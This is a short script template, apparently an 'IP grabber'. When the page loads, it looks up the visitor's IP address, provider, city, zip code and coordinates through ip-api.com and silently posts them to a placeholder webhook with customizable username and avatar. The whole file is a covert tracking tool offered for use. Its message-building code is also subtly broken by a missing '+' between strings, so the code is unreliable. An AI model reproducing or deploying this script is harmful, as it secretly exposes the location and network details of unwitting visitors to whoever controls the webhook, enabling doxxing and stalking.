
<script>
var webHookUrl = "YOUR WEBHOOK";

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('http://ip-api.com/json/'); //link to API
    const data = await response.json();

   
    var ip = data.query; // this takes the data from the IP API 

    var provider = data.org + " (" + data.as + ")";

    var timezone = data.timezone;
    var country = data.country;
    var countryCode = data.countryCode.toLowerCase()
    var region = data.region + " (" + data.regionName + ")";
    var city = data.city;

    var zip = data.zip;
    var lat = data.lat;       
    var lon = data.lon;

  
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {   //this is the start of your webhook (FULLY CUSTOMIZABLE)
        username: "USERNAME",
        avatar_url: "IMAGE",
        content:   
                    "__**NEW IP Detected**__"
                    "```__**:globe_with_meridians: IP-Adress:**__ \n" 
                    + ip + 
                    "\n \n__**:telephone: Provider:**__ \n" 
                    + provider + 
                    "\n \n__**:map: Timezone:**__ \n" 
                    + timezone + 
                    "\n \n__**:flag_" + countryCode + ": Country:**__ \n" 
                    + country + 
                    "\n \n __**:park: Region:**__ \n" 
                    + region + 
                    "\n \n__**:cityscape: Zip Code:**__ \n" 
                    + zip + 
                    "\n \n __**:cityscape: City:**__ \n" 
                    + city + 
                    "\n \n__**:round_pushpin: Location:**__ \n" 
                            + "**Longitude:** " + lon + "\n"
                    + "**Latitude:** ```" + lat

    }

    postRequest.send(JSON.stringify(params));

}

request();
</script>
